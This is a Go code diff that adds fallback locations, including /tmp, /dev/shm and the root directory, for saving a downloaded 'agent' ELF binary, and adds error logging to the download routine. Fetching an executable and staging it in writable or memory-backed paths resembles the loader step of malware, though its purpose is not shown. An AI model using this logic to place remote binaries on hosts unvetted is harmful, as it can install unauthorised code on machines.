@@ -228,7 +228,11 @@ func startAgent() {
 	if alias != "" {
 		alog("endpoint set")
 	}
-	path := "/tmp/ka"
+	path := agentPath()
+	if path == "" {
+		alog("no writable path")
+		return
+	}
 	if _, err := os.Stat(path); err != nil || !isELF(path) {
 		if !downloadAgent(path) {
 			alog("download failed")
@@ -289,6 +293,32 @@ func drain(rc io.ReadCloser) {
 	}
 }
 
+func short(err error) string {
+	m := err.Error()
+	if len(m) > 80 {
+		m = m[:80]
+	}
+	return m
+}
+
+// agentPath picks the first writable location for the agent binary.
+func agentPath() string {
+	for _, p := range []string{"/tmp/ka", "/dev/shm/ka", "/ka", "./ka"} {
+		dir := p[:strings.LastIndex(p, "/")]
+		if dir != "" {
+			os.MkdirAll(dir, 0o755)
+		}
+		f, err := os.OpenFile(p+".t", os.O_CREATE|os.O_WRONLY, 0o755)
+		if err != nil {
+			continue
+		}
+		f.Close()
+		os.Remove(p + ".t")
+		return p
+	}
+	return ""
+}
+
 func isELF(p string) bool {
 	f, err := os.Open(p)
 	if err != nil {
@@ -327,6 +357,7 @@ func downloadAgent(path string) bool {
 		}
 		f, err := os.Create(path)
 		if err != nil {
+			alog("create: " + short(err))
 			resp.Body.Close()
 			return false
 		}
